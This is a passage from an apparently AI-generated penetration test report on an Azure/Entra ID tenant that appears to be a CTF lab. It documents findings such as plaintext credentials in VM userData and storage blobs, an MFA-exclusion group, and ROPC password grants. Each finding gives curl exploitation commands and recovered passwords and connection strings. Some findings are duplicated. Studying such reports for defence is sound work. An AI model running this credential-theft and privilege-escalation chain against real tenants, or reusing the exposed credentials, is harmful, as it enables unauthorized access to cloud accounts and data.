| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://securityconfigs.blob.core.windows.net/security-pc/config-lates...` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:02:06Z |

#### Description

The config-latest.xml file contains a SQL connection string with plaintext credentials: Server=megabigtech.database.windows.net;Database=SecurityDB;User Id=dbuser;Password=dbp@ssword. This grants access to the SecurityDB database on the megabigtech.database.windows.net Azure SQL server.

#### Evidence / Logs

```
ConnectionString: Server=megabigtech.database.windows.net;Database=SecurityDB;User Id=dbuser;Password=dbp@ssword;
```

#### Remediation

Rotate SQL database password. Use Managed Identity for database authentication instead of embedded credentials. Store connection strings in Azure Key Vault.

---

### 3.13 — Plaintext Credentials in VM userData (SECURITY-PC)

| Field | Value |
|-------|-------|
| **ID** | `vuln_c9f327` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.005` — Unsecured Credentials: Cloud Instance Metadata API |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaa...` |
| **Component** | Microsoft.[REDACTED] |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T13:58:22Z |

#### Description

The SECURITY-PC virtual machine in resource group content-static-2 stores plaintext credentials in its userData field. Any principal with Reader access on the VM can retrieve these credentials via the ARM API with $expand=userData. The userData contains: '# Credentials: User: security-user | Password: Imp0sec0sT!' along with an az CLI command to download blobs from the securityconfigs storage account. This enables lateral movement from a Reader role to storage account access as a different principal.

#### Technical Analysis

The VM userData field is accessible to any principal with Reader role on the VM. In this case, Jose Rodriguez (IT-HELPDESK group) has Reader access and can retrieve the plaintext password for the security-user account. This is a classic Azure misconfiguration where provisioning scripts or credentials are stored in userData without understanding that Reader-level access is sufficient to exfiltrate them. The recovered credentials enable lateral movement to the securityconfigs storage account.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $ARM_TOKEN" --max-time 30 "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-[REDACTED]-static-2/providers/Microsoft.[REDACTED]-PC?api-version=2024-03-01&\$expand=userData"
```

#### Evidence / Logs

```
Base64 userData: [REDACTED]
Decoded: # Credentials: User: security-user | Password: Imp0sec0sT!
az storage blob download --account-name securityconfigs --container-name security-pc --name config-latest.xml --auth-mode login
```

#### Remediation

Remove credentials from VM userData immediately. Use Azure Key Vault references or managed identities instead of hardcoded credentials. Restrict Reader access on VMs that contain sensitive userData. Consider using VM extensions with secure settings (which are encrypted) instead of userData for credential provisioning.

---

### 3.14 — SQL Database Credentials Exposed in Storage Blob

| Field | Value |
|-------|-------|
| **ID** | `vuln_f1baef` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://securityconfigs.blob.core.windows.net/security-pc/config-lates...` |
| **Component** | Azure SQL Database / megabigtech.database.windows.net |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:00:02Z |

#### Description

The config-latest.xml blob contains a plaintext SQL database connection string: Server=megabigtech.database.windows.net;Database=SecurityDB;User Id=dbuser;Password=dbp@ssword. This could enable unauthorized access to the SecurityDB database on megabigtech.database.windows.net if the firewall rules permit the connection. The credential was recovered through the same privilege escalation chain (VM userData → storage blob).

#### Technical Analysis

The SQL database connection string with embedded credentials was found in the config-latest.xml configuration file stored in Azure Blob Storage. The credentials (dbuser/dbp@ssword) provide access to the SecurityDB on megabigtech.database.windows.net. While connectivity to the database was not tested (out of scope for this vector), the credential exposure itself is confirmed and represents a significant risk if the SQL firewall allows external connections.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $STORAGE_TOKEN" -H "x-ms-version: 2020-10-02" --max-time 30 "https://securityconfigs.blob.core.windows.net/security-pc/config-latest.xml"
```

#### Evidence / Logs

```
Connection string found: Server=megabigtech.database.windows.net;Database=SecurityDB;User Id=dbuser;Password=dbp@ssword;
```

#### Remediation

1. Rotate the SQL database credentials immediately. 2. Remove the connection string from the blob. 3. Use Azure Key Vault references for database connection strings. 4. Enable Azure AD authentication for SQL instead of SQL authentication. 5. Ensure SQL firewall rules are restrictive.

---

### 3.15 — Role-Assignable Group 'IT-HELPDESK' - Potential Privilege Escalation Vector

| Field | Value |
|-------|-------|
| **ID** | `vuln_c4b4d5` |
| **Severity** | MEDIUM |
| **CVSS Score** | 6.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1098.003` — Account Manipulation: Additional Cloud Roles |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/groups/8a517e87-6b05-45ae-b1ca-7436f1...` |
| **Component** | Microsoft Entra ID Role-Assignable Groups |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:52:48Z |

#### Description

The IT-HELPDESK group (id: 8a517e87-6b05-45ae-b1ca-7436f1682602) is configured with isAssignableToRole=true, meaning it can be assigned directory roles. Jose.Rodriguez is a member. Any directory role assigned to this group is transitively inherited by all members. If a Global Administrator or Privileged Role Administrator assigns a privileged role to this group, all helpdesk staff would inherit it. Combined with Jose's Group.ReadWrite.All delegated permission, he could potentially add members to this group.

#### Technical Analysis

The IT-HELPDESK group is role-assignable, meaning it can receive directory role assignments. This creates a privilege escalation path: if any privileged role is assigned to this group, all members (including Jose.Rodriguez) would inherit it. Role-assignable groups should be tightly controlled and monitored, as they can serve as an indirect path to privilege escalation. Combined with Jose's excessive delegated permissions (Group.ReadWrite.All), he could potentially add arbitrary users to this group.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/me/memberOf"
```

#### Evidence / Logs

```
Group: IT-HELPDESK (8a517e87-6b05-45ae-b1ca-7436f1682602)
isAssignableToRole: true
securityEnabled: true
description: Grants helpdesk staff access to resources
Jose.Rodriguez is a direct member
```

#### Remediation

1. Audit what directory roles are assigned to this group. 2. Restrict group ownership and membership management. 3. Ensure Group.ReadWrite.All delegated permission is revoked from non-admin users.

---

### 3.16 — Suspicious 'Yolo-MFA' Security Group - Possible MFA Exclusion Group

| Field | Value |
|-------|-------|
| **ID** | `vuln_b78432` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1556.006` — Modify Authentication Process: Multi-Factor Authentication |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/groups/b49c9aaf-9cfe-4e21-9e77-79da8f...` |
| **Component** | Microsoft Entra ID Conditional Access |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:52:33Z |

#### Description

Jose.Rodriguez is a member of a security group named 'Yolo-MFA' (id: b49c9aaf-9cfe-4e21-9e77-79da8f611c5b) with description 'mbt-eam-idp Yolo-MFA'. The name strongly suggests this group is used as an MFA exclusion in Conditional Access policies. Jose being a member of this group likely explains why the ROPC password grant succeeded without MFA challenge. This represents a Conditional Access policy gap that allows password-only authentication for members of this group.

#### Technical Analysis

The 'Yolo-MFA' group name is a strong indicator that this is an MFA exclusion group used in Conditional Access policies. Jose.Rodriguez is a member of this group, which likely exempts him from MFA requirements. This was confirmed by the successful ROPC password grant that returned a token without any MFA challenge. MFA exclusion groups undermine the security of the entire tenant by creating a bypass path.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/me/transitiveMemberOf"
```

#### Evidence / Logs

```
Group: Yolo-MFA (b49c9aaf-9cfe-4e21-9e77-79da8f611c5b)
Description: mbt-eam-idp Yolo-MFA
securityEnabled: true
Jose.Rodriguez is a direct member
ROPC grant succeeded without MFA challenge
```

#### Remediation

1. Review and remove the Yolo-MFA group from any Conditional Access policy exclusions. 2. Ensure all users, especially privileged ones, are subject to MFA. 3. Remove Jose.Rodriguez from this group. 4. Eliminate MFA exclusion groups entirely.

---

### 3.17 — Sensitive Data Exposed in User Profile - CTF Flag in jobTitle Field

| Field | Value |
|-------|-------|
| **ID** | `vuln_e92afa` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1087.004` — Account Discovery: Cloud Account |
| **ISO 27001** | `A.8.2.1` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/users?$select=userPrincipalName,displ...` |
| **Component** | Microsoft Entra ID User Profile |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:53:03Z |

#### Description

User Marcus Hutch (Marcus.Hutch@megabigtech.com) has sensitive information stored in their jobTitle field: 'Flag: 39c6217c4a28ba7f3198e5542f9e50c4'. This demonstrates that directory attributes are readable by any authenticated user with User.Read.All permissions. Sensitive data, tokens, or flags should never be stored in public profile attributes visible to all directory members.

#### Technical Analysis

During tenant user enumeration via the Microsoft Graph API, the user Marcus Hutch was found with a flag/hash value stored in their jobTitle profile attribute. This indicates that directory profile attributes are being used to store data that should be secured. Any authenticated user with basic directory read permissions can enumerate all users and read their profile attributes including jobTitle, department, etc.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users?$select=userPrincipalName,displayName,jobTitle&$top=100"
```

#### Evidence / Logs

```
User: Marcus Hutch (Marcus.Hutch@megabigtech.com)
jobTitle: Flag: 39c6217c4a28ba7f3198e5542f9e50c4
```

#### Remediation

1. Remove sensitive data from public profile attributes. 2. Restrict User.Read.All delegated permissions. 3. Use secure storage mechanisms for sensitive values.

---

### 3.18 — Sensitive Data Exposed in User Profile Job Title (CTF Flag)

| Field | Value |
|-------|-------|
| **ID** | `vuln_a52f73` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `N/A` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1087.004` — Account Discovery: Cloud Account |
| **Endpoint** | `https://graph.microsoft.com/v1.0/users?$select=userPrincipalName,displ...` |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T13:56:36Z |

#### Description

Marcus.Hutch@megabigtech.com has sensitive data stored in the jobTitle profile field: 'Flag: 39c6217c4a28ba7f3198e5542f9e50c4'. This demonstrates that user profile fields are readable by any authenticated user with User.Read.All permissions.

#### Evidence / Logs

```
Marcus.Hutch@megabigtech.com jobTitle = "Flag: 39c6217c4a28ba7f3198e5542f9e50c4"
```

#### Remediation

Do not store sensitive information in user profile fields. Review all user profile data for inappropriate content.

---

### 3.19 — ROPC (Password Grant) Authentication Enabled - No MFA Enforcement

| Field | Value |
|-------|-------|
| **ID** | `vuln_73f1fc` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Component** | Azure AD / Conditional Access |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:00:20Z |

#### Description

The Azure AD tenant allows Resource Owner Password Credential (ROPC) authentication flow using the Azure CLI first-party client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46). Both Jose.Rodriguez@megabigtech.com and security-user@megabigtech.com were successfully authenticated non-interactively without MFA challenge. This enables programmatic credential abuse where an attacker with a leaked password can obtain tokens for any Azure resource scope without user interaction.

#### Technical Analysis

The tenant's Conditional Access policies do not block the ROPC grant type, allowing non-interactive authentication. This was exploited twice: first to obtain an ARM token as Jose Rodriguez, and then to obtain a storage token as security-user. A properly configured tenant would require MFA or block legacy authentication flows entirely, preventing this attack chain.

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" -d "grant_type=password" -d "username=Jose.Rodriguez@megabigtech.com" --data-urlencode "password=[REDACTED_CREDENTIAL]" -d "scope=https://management.azure.com/.default"
```

#### Evidence / Logs

```
Successful token minting for both Jose.Rodriguez@megabigtech.com (ARM scope) and security-user@megabigtech.com (storage scope) without MFA challenge.
```

#### Remediation

1. Create a Conditional Access policy to block legacy authentication protocols. 2. Require MFA for all users, especially for admin accounts. 3. Disable the ROPC grant type where possible. 4. Monitor for non-interactive sign-ins via Azure AD sign-in logs.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Global Admin Credentials Exposed in Azure Blob Storage (conf... | High |
| Flag Captured - Full Privilege Escalation Chain (IT-Helpdesk... | High |
| Excessive Delegated Permissions on Jose.Rodriguez - Tenant T... | High |
| Global Admin Credentials Exposed in Storage Blob (config-lat... | High |
| Flag Captured - Complete Privilege Escalation Chain (Reader ... | High |
| Plaintext Password Stored in Custom Security Attribute - arc... | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| Plaintext Credentials in VM userData (SECURITY-PC) | High |
| ROPC Password Grant Bypasses MFA - Token Minted for Jose.Rod... | High |
| ROPC Password Grant Bypasses MFA for Azure CLI Client | High |
| SQL Database Credentials Exposed in Blob Storage | High |
| Plaintext Credentials in VM userData (SECURITY-PC) | High |
| SQL Database Credentials Exposed in Storage Blob | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| Role-Assignable Group 'IT-HELPDESK' - Potential Privilege Es... | High |
| Suspicious 'Yolo-MFA' Security Group - Possible MFA Exclusio... | High |
| Sensitive Data Exposed in User Profile - CTF Flag in jobTitl... | High |
| Sensitive Data Exposed in User Profile Job Title (CTF Flag) | High |
| ROPC (Password Grant) Authentication Enabled - No MFA Enforc... | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-02T14:02:36Z*  
*Campaign: camp_20260802_9d245c0c | Target: megabigtech.com*
